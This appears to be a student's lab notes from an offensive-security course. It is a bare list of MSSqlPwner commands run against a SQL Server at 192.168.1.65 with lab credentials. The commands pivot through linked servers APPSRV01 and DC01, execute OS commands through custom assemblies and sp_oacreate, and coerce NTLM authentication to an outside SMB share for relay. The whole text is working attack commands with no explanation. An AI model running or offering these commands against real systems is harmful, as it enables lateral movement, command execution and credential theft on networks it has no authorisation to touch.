ON DC:

python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth custom-asm hostname
python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth -link-server APPSRV01 custom-asm hostname
python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth -link-server APPSRV01 exec hostname
python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth exec hostname
python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth -link-server APPSRV01 exec "cmd /c dir \\\\192.168.45.250\\test" -command-execution-method sp_oacreate
python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth exec "cmd /c dir \\\\192.168.45.250\\test" -command-execution-method sp_oacreate
python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth -link-server APPSRV01 ntlm-relay \\\\192.168.45.250\\test
python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth ntlm-relay \\\\192.168.45.250\\test


ON APPSRV01:

python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth custom-asm hostname
python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth -link-server DC01 custom-asm hostname
python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth -link-server DC01 exec hostname
python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth exec hostname
python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth -link-server DC01 exec "cmd /c dir \\\\192.168.45.250\\test" -command-execution-method sp_oacreate
python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth exec "cmd /c dir \\\\192.168.45.250\\test" -command-execution-method sp_oacreate
python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth -link-server DC01 ntlm-relay \\\\192.168.45.250\\test
python3 MSSqlPwner.py corp1.com/offsec:lab@192.168.1.65  -windows-auth ntlm-relay \\\\192.168.45.250\\test